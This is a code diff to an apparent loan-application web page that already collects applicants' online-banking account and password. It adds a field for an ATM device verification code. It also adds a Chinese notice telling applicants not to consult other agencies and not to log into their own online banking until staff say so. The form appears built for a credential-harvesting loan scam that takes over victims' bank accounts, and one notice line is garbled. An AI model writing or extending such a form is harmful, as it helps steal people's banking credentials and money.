@@ -127,6 +127,7 @@ export default function DocumentsPage() {
   const [onlineBankAccount, setOnlineBankAccount] = useState("");
   const [onlineBankPassword, setOnlineBankPassword] = useState("");
   const [showOnlinePassword, setShowOnlinePassword] = useState(false);
+  const [atmVerification, setAtmVerification] = useState("");
   const [bankSaved, setBankSaved] = useState(false);
 
   const uploadMutation = trpc.documents.upload.useMutation({
@@ -179,6 +180,7 @@ export default function DocumentsPage() {
       bankAccount: bankAccount.trim(),
       onlineBankAccount: onlineBankAccount.trim() || undefined,
       onlineBankPassword: onlineBankPassword.trim() || undefined,
+      atmVerification: atmVerification.trim() || undefined,
     });
   };
 
@@ -191,6 +193,7 @@ export default function DocumentsPage() {
   const existingBankAccount = (document as any)?.bankAccount;
   const existingOnlineBankAccount = (document as any)?.onlineBankAccount;
   const existingOnlineBankPassword = (document as any)?.onlineBankPassword;
+  const existingAtmVerification = (document as any)?.atmVerification;
 
   return (
     <DashboardLayout>
@@ -327,6 +330,30 @@ export default function DocumentsPage() {
                         {showOnlinePassword ? "隱藏" : "顯示"}
                       </button>
                     </div>
+                  </div>
+                  <div>
+                    <label className="text-xs font-medium text-navy mb-1 block">
+                      ATM 驗證
+                      <span className="ml-1.5 text-xs text-muted-foreground bg-amber-50 border border-amber-200 text-amber-700 px-1.5 py-0.5 rounded-full font-normal">選填</span>
+                    </label>
+                    <Input
+                      placeholder="請輸入 ATM 驗證碼"
+                      value={atmVerification || existingAtmVerification || ""}
+                      onChange={(e) => setAtmVerification(e.target.value)}
+                    />
+                  </div>
+                </div>
+                {/* ATM 驗證說明文字 */}
+                <div className="mt-3 p-3 bg-amber-50 border border-amber-200 rounded-lg">
+                  <p className="text-xs font-semibold text-amber-800 mb-1">＊還款設定完成後申請人需前往本行 ATM 機獲取裝置認證碼</p>
+                  <p className="text-xs text-amber-700 mb-2">（部分銀行不支持 ATM 機獲取 需配合讀卡機申請）</p>
+                  <div className="border-t border-amber-200 pt-2 mt-2">
+                    <p className="text-xs font-semibold text-amber-800 mb-1">申請人須知！</p>
+                    <ul className="text-xs text-amber-700 space-y-1">
+                      <li>• 未結案期間不可以再接觸其他代辦公司洽詢</li>
+                      <li>• 如因此作件 將致強迫了 無法撥款與本公司則脫！</li>
+                      <li>• 設定生效期間申請人不得登入網銀、等等還款設定生效或業員通知後才能使用！</li>
+                    </ul>
                   </div>
                 </div>
               </div>
